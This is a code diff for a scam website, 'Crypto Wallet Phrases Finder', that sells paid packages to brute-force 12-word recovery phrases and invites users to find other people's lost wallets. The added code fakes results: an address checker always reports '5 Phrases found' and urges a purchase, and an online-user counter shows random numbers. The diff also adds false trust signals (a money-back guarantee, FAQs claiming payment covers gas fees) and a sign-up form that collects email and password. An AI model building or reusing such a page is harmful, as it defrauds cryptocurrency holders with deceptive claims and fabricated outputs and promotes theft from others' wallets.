@@ -79,14 +79,36 @@
   }
   h1, h2, h3 {
     font-family: 'Orbitron', sans-serif;
-    animation: float 3s ease-in-out infinite;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: titleGlow 3s ease-in-out infinite alternate;
   }
+
+  @keyframes titleGlow {
+    0% {
+      text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
+    }
+    100% {
+      text-shadow: 0 0 20px rgba(255, 0, 255, 0.8), 0 0 35px rgba(0, 255, 255, 0.6);
+    }
+  }
+  
   h1 {
-    font-size: 2.5em;
+    font-size: 2.8em;
     margin-bottom: 10px;
     color: var(--primary-color);
     text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
   }
+  
+  h2 {
+    font-size: 2.4em;
+  }
+
+  h3 {
+    font-size: 2em;
+  }
+
   .online-counter {
     font-size: 1.2em;
     color: var(--primary-color);
@@ -95,7 +117,7 @@
     padding: 10px 20px;
     display: inline-block;
     box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
-    animation: pulse 2s infinite, float 3s ease-in-out infinite;
+    animation: pulse 2s infinite;
   }
 
   .online-counter span {
@@ -109,12 +131,6 @@
     100% { box-shadow: 0 0 15px rgba(0, 255, 255, 0.3); }
   }
 
-  @keyframes float {
-    0% { transform: translateY(0px); }
-    50% { transform: translateY(-5px); }
-    100% { transform: translateY(0px); }
-  }
-
   .crypto-particles {
     position: absolute;
     top: 0;
@@ -122,6 +138,91 @@
     width: 100%;
     height: 100%;
   }
+  .new-section {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 30px;
+    margin-bottom: 40px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    text-align: center;
+  }
+  .new-section h3 {
+    color: var(--primary-color);
+    margin-bottom: 20px;
+  }
+  .bitcoin-input {
+    width: 100%;
+    max-width: 400px;
+    padding: 10px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 5px;
+    background: rgba(255, 255, 255, 0.1);
+    color: var(--text-color);
+    font-family: 'Roboto', sans-serif;
+  }
+
+  .check-btn {
+    padding: 10px 20px;
+    background: var(--primary-color);
+    color: var(--background-color);
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+  }
+
+  .check-btn:hover {
+    background: var(--secondary-color);
+  }
+
+  .popup {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.4);
+    animation: fadeIn 0.3s;
+  }
+
+  .popup-content {
+    background-color: #2a2a4a;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    max-width: 500px;
+    border-radius: 15px;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+
+  .popup-content button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    background: var(--primary-color);
+    color: var(--background-color);
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+  }
+
+  .popup-content button:hover {
+    background: var(--secondary-color);
+  }
+
+  @keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+
   .explanation {
     background: rgba(255, 255, 255, 0.05);
     border-radius: 15px;
@@ -231,7 +332,9 @@
     width: 100%;
     padding: 15px;
     font-size: 1.1em;
-    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--primary-color));
+    background-size: 200% 200%;
+    animation: shimmer 3s linear infinite;
     color: #1a1a2e;
     border: none;
     border-radius: 25px;
@@ -756,6 +859,28 @@
     100% { transform: rotate(360deg); }
   }
 
+  #loading-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: var(--background-color);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+
+  .loader {
+    width: 50px;
+    height: 50px;
+    border: 5px solid var(--primary-color);
+    border-top: 5px solid var(--secondary-color);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
   .new-section {
     background: rgba(255, 255, 255, 0.05);
     border-radius: 15px;
@@ -771,11 +896,24 @@
   }
 
   .new-section .tagline {
-    font-size: 1.5em;
-    color: var(--secondary-color);
-    margin-bottom: 30px;
+    overflow: hidden;
+    border-right: .15em solid var(--secondary-color);
+    white-space: nowrap;
+    margin: 0 auto;
+    letter-spacing: .15em;
+    animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
   }
 
+  @keyframes typing {
+    from { width: 0 }
+    to { width: 100% }
+  }
+
+  @keyframes blink-caret {
+    from, to { border-color: transparent }
+    50% { border-color: var(--secondary-color); }
+  }
+  
   .new-section .info-box, .new-section .features-box {
     background: rgba(255, 255, 255, 0.1);
     border-radius: 10px;
@@ -807,9 +945,136 @@
     font-style: italic;
     margin-bottom: 30px;
   }
+
+  .bitcoin-input {
+    width: 100%;
+    max-width: 400px;
+    padding: 10px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 5px;
+    background: rgba(255, 255, 255, 0.1);
+    color: var(--text-color);
+    font-family: 'Roboto', sans-serif;
+  }
+
+  .check-btn {
+    padding: 10px 20px;
+    background: var(--primary-color);
+    color: var(--background-color);
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+  }
+
+  .check-btn:hover {
+    background: var(--secondary-color);
+  }
+
+  .popup {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.4);
+    animation: fadeIn 0.3s;
+  }
+
+  .popup-content {
+    background-color: #2a2a4a;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    max-width: 500px;
+    border-radius: 15px;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+
+  .popup-content button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    background: var(--primary-color);
+    color: var(--background-color);
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+  }
+
+  .popup-content button:hover {
+    background: var(--secondary-color);
+  }
+
+  .faq-section {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 30px;
+    margin-top: 40px;
+    margin-bottom: 20px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+  }
+
+  .faq-section h2 {
+    color: var(--primary-color);
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .faq-container {
+    max-width: 800px;
+    margin: 0 auto;
+  }
+
+  .faq-item {
+    margin-bottom: 20px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    padding-bottom: 20px;
+  }
+
+  .faq-question {
+    font-weight: bold;
+    color: var(--secondary-color);
+    cursor: pointer;
+    padding: 10px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 5px;
+    transition: all 0.3s ease;
+  }
+
+  .faq-question:hover {
+    background: rgba(255, 255, 255, 0.1);
+  }
+
+  .faq-answer {
+    display: none;
+    padding: 15px;
+    background: rgba(0, 0, 0, 0.1);
+    border-radius: 0 0 5px 5px;
+    margin-top: 5px;
+  }
+
+  .faq-item.active .faq-answer {
+    display: block;
+  }
+
+  .faq-item.active .faq-question {
+    border-radius: 5px 5px 0 0;
+  }
 </style>
 </head>
 <body>
+  <div id="loading-screen">
+    <div class="loader"></div>
+  </div>
   <header>
     <div class="header-content">
       <h1>Crypto Wallet Phrases Finder</h1>
@@ -820,17 +1085,24 @@
     <div class="crypto-particles" id="crypto-particles"></div>
   </header>
 
-  <div id="signupSection" class="signup-section">
+  <div class="container">
+    <div class="new-section">
+      <h3>Your Receive Bitcoin Address:</h3>
+      <p>Check your Bitcoin past wallet Address you had for lost Funds</p>
+      <input type="text" id="bitcoinAddress" placeholder="Enter your Bitcoin address" class="bitcoin-input">
+      <button class="check-btn" onclick="checkAddress()">Check Now for Free</button>
+    </div>
+
+    <div id="signupSection" class="signup-section">
       <input type="email" id="signupEmail" placeholder="Email Address" required>
       <input type="password" id="signupPassword" placeholder="Password" required>
       <button id="signupButton">Sign Up</button>
-  </div>
+    </div>
 
-  <div id="signupSuccessPopup" class="popup">
+    <div id="signupSuccessPopup" class="popup">
       <p>YOU SIGN UP SUCCESSFULLY</p>
-  </div>
+    </div>
 
-  <div class="container">
     <div class="new-section">
       <h2>Lost Your Crypto Wallet?</h2>
       <h3>Want to Find others Lost Wallets?</h3>
@@ -838,6 +1110,11 @@
       
       <div class="info-box">
         <p>Introducing our cutting-edge system designed to recover lost crypto wallets using the 12 recovery phrases. Our advanced technology generates thousands of phrase combinations on the Blockchain Network, ensuring you can find your lost wallets quickly and securely.</p>
+      </div>
+      
+      <div class="guarantee-box">
+        <h3>Money Back Guarantee</h3>
+        <p>We're so confident in our service that we offer a full money-back guarantee if we don't find a lost wallet for you. Your satisfaction is our top priority!</p>
       </div>
       
       <div class="features-box">
@@ -880,7 +1157,7 @@
     </div>
 
     <button class="phrases-finder-btn" onclick="openPhrasesFinder()">
-      <span>Click for 1 search Free</span>
+      <span>Click for 1 search Free on Us</span>
     </button>
 
     <div class="packages">
@@ -890,7 +1167,7 @@
           <p class="price">$50</p>
         </div>
         <ul class="package-features">
-          <li>2 Searches on the Blockchain of 1 hour</li>
+          <li>2 Searches on the Blockchain</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -902,7 +1179,7 @@
           <p class="price">$100</p>
         </div>
         <ul class="package-features">
-          <li>5 Searches on the Blockchain of 2 hours</li>
+          <li>5 Searches on the Blockchain</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -914,7 +1191,7 @@
           <p class="price">$180</p>
         </div>
         <ul class="package-features">
-          <li>10 Searches on the Blockchain of 3 hours</li>
+          <li>10 Searches on the Blockchain</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -926,7 +1203,7 @@
           <p class="price">$220</p>
         </div>
         <ul class="package-features">
-          <li>15 Searches on the Blockchain of 4 hours</li>
+          <li>15 Searches on the Blockchain</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -938,7 +1215,7 @@
           <p class="price">$400</p>
         </div>
         <ul class="package-features">
-          <li>50 Searches on the Blockchain of 24 hours</li>
+          <li>50 Searches on the Blockchain</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -979,8 +1256,61 @@
     </div>
 
     <button class="phrases-finder-btn" onclick="openPhrasesFinder()">
-      <span>Click for 1 search Free</span>
+      <span>Click for 1 search Free on Us</span>
     </button>
+
+    <div id="popupNotification" class="popup">
+      <div class="popup-content">
+        <p>5 Phrases found on the BlockChain Network for this wallet address, Please buy a search for Minimum 1 hour of searching</p>
+        <button onclick="closePopup()">Close</button>
+      </div>
+    </div>
+
+    <div class="faq-section">
+      <h2>Frequently Asked Questions (FAQs)</h2>
+      <div class="faq-container">
+        <div class="faq-item">
+          <div class="faq-question">1. How does your system recover lost crypto wallets?</div>
+          <div class="faq-answer">Our advanced system uses cutting-edge technology to generate thousands of combinations of the 12 recovery phrases. It then scans the Blockchain Network to help recover lost wallets quickly and efficiently.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">2. Is my data secure during the wallet recovery process?</div>
+          <div class="faq-answer">Absolutely! We prioritize your privacy and security. All data processed during recovery is encrypted, ensuring that your sensitive information remains protected.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">3. What if the system cannot recover my lost wallet?</div>
+          <div class="faq-answer">If we are unable to recover your lost wallet, we offer a full money-back guarantee. We are confident in our technology, and your satisfaction is our top priority.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">4. How long does the recovery process take?</div>
+          <div class="faq-answer">The recovery process depends on several factors, but our advanced technology is designed to explore countless combinations efficiently, ensuring a fast and reliable wallet recovery.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">5. Why should I trust your service?</div>
+          <div class="faq-answer">Our system is built on blockchain technology, which is known for its transparency and security. Additionally, we offer a money-back guarantee if we don't recover your wallet, giving you confidence in our service.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">6. What does the payment cover?</div>
+          <div class="faq-answer">The payment covers the blockchain gas fees required for our software to search for your lost wallet. We only charge for the actual process of searching the blockchain, ensuring a transparent and fair pricing structure.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">7. Can your system recover wallets with no balance?</div>
+          <div class="faq-answer">No, our Phrases Finder software is designed to search only for wallets that have an available balance. This ensures we focus our efforts on finding wallets that contain funds.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">8. Do you offer this service worldwide?</div>
+          <div class="faq-answer">Yes, our system is designed to search for lost wallets across the globe, so no matter where you are, we can help recover your lost wallet.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">9. How does your "Phrases Finder" software work?</div>
+          <div class="faq-answer">Our Phrases Finder software generates thousands of potential recovery phrase combinations and checks them against the blockchain network. It specifically searches for wallets with an available balance, streamlining the recovery process.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">10. What if I have forgotten both my wallet password and recovery phrase?</div>
+          <div class="faq-answer">Our system focuses on recovering wallets using the 12 recovery phrases. If you've forgotten both, it may limit the chances of recovery, but our system is still highly efficient in exploring possible combinations.</div>
+        </div>
+      </div>
+    </div>
   </div>
 
   <div id="purchaseModal" class="modal">
@@ -1003,6 +1333,12 @@
     </div>
   </div>
 
+  <div class="company-info">
+    <h3>Our Address</h3>
+    <p>71-75 Shelton Street, Covent Garden, WC2H 9JQ, London, United Kingdom</p>
+    <p>Company number: 14462289</p>
+  </div>
+
   <a href="mailto:John.shoppyai@gmail.com?subject=More%20details%20about%20the%20System&body=Hi%2C%20I%20want%20more%20details%20about%20the%20System" class="email-btn">
     <i class="fas fa-envelope"></i>
   </a>
@@ -1014,79 +1350,88 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
   <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
   <script>
-    function removeSignupSection() {
-        const signupSection = document.getElementById('signupSection');
-        if (signupSection) {
-            signupSection.remove();
-        }
-    }
-
-    document.getElementById('signupButton').addEventListener('click', function() {
-        const email = document.getElementById('signupEmail').value;
-        const password = document.getElementById('signupPassword').value;
-
-        if (email && password) {
-            showPopup('signupSuccessPopup');
-            document.getElementById('signupEmail').value = '';
-            document.getElementById('signupPassword').value = '';
-            removeSignupSection();
-        } else {
-            alert('Please enter both email and password');
-        }
-    });
-
-    particlesJS('crypto-particles', {
-      particles: {
-        number: { value: 100, density: { enable: true, value_area: 800 } },
-        color: { value: ["#00ffff", "#ff00ff", "#ffffff"] },
-        shape: { type: ["circle", "triangle", "polygon"], polygon: { nb_sides: 5 } },
-        opacity: { value: 0.6, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false } },
-        size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1, sync: false } },
-        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
-        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out", bounce: false, attract: { enable: false, rotateX: 600, rotateY: 1200 } }
-      },
-      interactivity: {
-        detect_on: "canvas",
-        events: {
-          onhover: { enable: true, mode: "repulse" },
-          onclick: { enable: true, mode: "push" },
-          resize: true
-        },
-        modes: {
-          grab: { distance: 400, line_linked: { opacity: 1 } },
-          bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
-          repulse: { distance: 200, duration: 0.4 },
-          push: { particles_nb: 4 },
-          remove: { particles_nb: 2 }
-        }
-      },
-      retina_detect: true
-    });
-
-    function updateOnlineCount() {
-      const count = Math.floor(Math.random() * (142 - 11 + 1)) + 11;
-      document.getElementById('online-count').textContent = count;
-    }
-
-    setInterval(updateOnlineCount, 7000);
-
-    function createCryptoIcons() {
-      const iconClasses = ['btc', 'eth', 'ltc', 'xrp'];
-      const container = document.querySelector('.container');
-      
-      for (let i = 0; i < 20; i++) {
-        const icon = document.createElement('div');
-        icon.className = `crypto-icon ${iconClasses[Math.floor(Math.random() * iconClasses.length)]}`;
-        icon.style.left = `${Math.random() * 100}%`;
-        icon.style.top = `${Math.random() * 100}%`;
-        icon.style.animationDelay = `${Math.random() * 2}s`;
-        container.appendChild(icon);
-      }
-    }
-
     document.addEventListener('DOMContentLoaded', () => {
-      createCryptoIcons();
+      const loadingScreen = document.getElementById('loading-screen');
+
+      // Show loading screen
+      loadingScreen.style.display = 'flex';
       
+      // Hide loading screen after 2 seconds
+      setTimeout(() => {
+        loadingScreen.style.display = 'none';
+        // Call the rest of your initialization functions here
+        createCryptoIcons();
+        animateOnScroll();
+        updateOnlineCount();
+      }, 2000);
+      
+      const signupSection = document.getElementById('signupSection');
+      if (signupSection) {
+          removeSignupSection();
+      }
+
+      document.getElementById('signupButton').addEventListener('click', function() {
+          const email = document.getElementById('signupEmail').value;
+          const password = document.getElementById('signupPassword').value;
+
+          if (email && password) {
+              showPopup('signupSuccessPopup');
+              document.getElementById('signupEmail').value = '';
+              document.getElementById('signupPassword').value = '';
+          } else {
+              alert('Please enter both email and password');
+          }
+      });
+
+      particlesJS('crypto-particles', {
+        particles: {
+          number: { value: 100, density: { enable: true, value_area: 800 } },
+          color: { value: ["#00ffff", "#ff00ff", "#ffffff"] },
+          shape: { type: ["circle", "triangle", "polygon"], polygon: { nb_sides: 5 } },
+          opacity: { value: 0.6, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false } },
+          size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1, sync: false } },
+          line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+          move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out", bounce: false, attract: { enable: false, rotateX: 600, rotateY: 1200 } }
+        },
+        interactivity: {
+          detect_on: "canvas",
+          events: {
+            onhover: { enable: true, mode: "repulse" },
+            onclick: { enable: true, mode: "push" },
+            resize: true
+          },
+          modes: {
+            grab: { distance: 400, line_linked: { opacity: 1 } },
+            bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
+            repulse: { distance: 200, duration: 0.4 },
+            push: { particles_nb: 4 },
+            remove: { particles_nb: 2 }
+          }
+        },
+        retina_detect: true
+      });
+
+      function updateOnlineCount() {
+        const count = Math.floor(Math.random() * (142 - 11 + 1)) + 11;
+        document.getElementById('online-count').textContent = count;
+      }
+
+      setInterval(updateOnlineCount, 7000);
+
+      function createCryptoIcons() {
+        const iconClasses = ['btc', 'eth', 'ltc', 'xrp'];
+        const container = document.querySelector('.container');
+        
+        for (let i = 0; i < 20; i++) {
+          const icon = document.createElement('div');
+          icon.className = `crypto-icon ${iconClasses[Math.floor(Math.random() * iconClasses.length)]}`;
+          icon.style.left = `${Math.random() * 100}%`;
+          icon.style.top = `${Math.random() * 100}%`;
+          icon.style.animationDelay = `${Math.random() * 2}s`;
+          container.appendChild(icon);
+        }
+      }
+
       const elements = document.querySelectorAll('.feature-box, .package, h2, h3');
       
       elements.forEach(element => {
@@ -1096,6 +1441,15 @@
       });
       
       animateOnScroll();
+
+      const faqItems = document.querySelectorAll('.faq-item');
+      
+      faqItems.forEach(item => {
+        const question = item.querySelector('.faq-question');
+        question.addEventListener('click', () => {
+          item.classList.toggle('active');
+        });
+      });
     });
 
     function openPhrasesFinder() {
@@ -1123,6 +1477,7 @@
       document.body.appendChild(loadingOverlay);
 
       setTimeout(() => {
+        loadingOverlay.remove();
         window.location.href = 'https://walletcryp.com/';
       }, 2000);
     }
@@ -1200,6 +1555,18 @@
           element.style.transform = 'translateY(0)';
         }
       });
+    }
+
+    function checkAddress() {
+      const popup = document.getElementById('popupNotification');
+      popup.style.display = 'block';
+      setTimeout(() => {
+        popup.style.display = 'none';
+      }, 7000);
+    }
+
+    function closePopup() {
+      document.getElementById('popupNotification').style.display = 'none';
     }
 
     window.addEventListener('scroll', animateOnScroll);
